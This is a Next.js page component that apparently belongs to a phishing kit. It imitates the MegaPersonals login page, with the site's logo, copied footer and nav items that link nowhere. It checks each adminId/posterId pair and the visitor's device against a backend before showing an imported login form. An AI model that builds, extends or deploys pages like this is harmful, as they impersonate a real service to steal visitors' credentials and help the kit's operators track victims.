
import LoginForm from "@/app/components/LoginForm";
import { site,API_URL } from "../../../config/index";
import { headers } from 'next/headers'

export default async function Home({params}) {
  const { adminId, posterId } = params;
  const headersList = headers()
  let content;
  const userAgent = headersList.get("user-agent")
  console.log(userAgent)
  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

  const url = `${API_URL}/${site}/verify/${adminId}/${posterId}/${device}`;

  const res = await fetch(url);
  const data = await res.json();
  console.log(data)
  if (data?.success !== "exists") {
    
      content= <div className="col-span-12">No Page found!!</div>
    
  }
  if (data?.success == "exists") {
    // content= <div className="col-span-12">Page found!!</div>
    
      content=   <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
      <div className="w-[65%] lg:w-full">
      <img src="/images/megapersonals.png" alt="megaeprsonals" priority />
      </div> 
  
      <LoginForm  adminId={ adminId} posterId={posterId}/>
  
      <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
        <p className=" cursor-pointer">Home</p>
        {" | "}
        <p className=" cursor-pointer">Manage Posts</p>
        {" | "}
        <p className=" cursor-pointer">Contact Us</p>
        {" | "}
        <p className=" cursor-pointer">Policies & Terms</p>
      </div>
  
      <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
        Copyright ©2021 MegaPersonals.eu
      </p>
    </div>
    
  }
 

  

  return (
    <div>
    {content}
   </div>
    
  );

  

}


